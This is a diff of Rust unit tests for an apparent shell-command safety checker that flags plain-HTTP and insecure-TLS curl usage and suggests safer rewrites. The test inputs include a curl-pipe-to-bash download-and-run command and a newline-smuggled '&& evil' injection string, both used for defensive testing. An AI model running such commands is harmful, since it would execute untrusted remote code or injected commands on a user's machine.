-        let cmd = "curl -fsSL http://example.com/install.sh | bash";
-        let v = verdict_with(vec![finding(RuleId::PlainHttpToSink)]);
-        let s = suggest(cmd, ShellType::Posix, &v);
-        let sc = s[0].safe_command.as_deref().unwrap();
-        assert!(sc.contains("https://example.com/install.sh"), "{sc}");
-        assert!(!sc.contains("http://"), "{sc}");
-    }
-
-    #[test]
-    fn https_url_not_double_rewritten() {
-        assert!(rewrite_http_to_https("curl https://example.com/x").is_none());
+    fn tls_and_http_option_grammar_ambiguities_are_guidance_only() {
+        for (cmd, finding) in [
+            (
+                "curl --data -k https://example.com/x",
+                finding(RuleId::InsecureTlsFlags),
+            ),
+            (
+                "curl -k https://safe.example/x\n-k && evil",
+                finding(RuleId::InsecureTlsFlags),
+            ),
+            (
+                "curl --header http://marker.example https://example.com/x",
+                plain_http_finding("http://marker.example/"),
+            ),
+            (
+                "curl --data http://marker.example https://example.com/x",
+                plain_http_finding("http://marker.example/"),
+            ),
+        ] {
+            for shell in [
+                ShellType::Posix,
+                ShellType::Fish,
+                ShellType::PowerShell,
+                ShellType::Cmd,
+            ] {
+                let suggestions = suggest(cmd, shell, &verdict_with(vec![finding.clone()]));
+                assert!(
+                    suggestions.iter().all(|entry| entry.safe_command.is_none()),
+                    "ambiguous {shell:?} rewrite became executable: {cmd}: {suggestions:?}"
+                );
+            }
+        }
     }
 
     #[test]
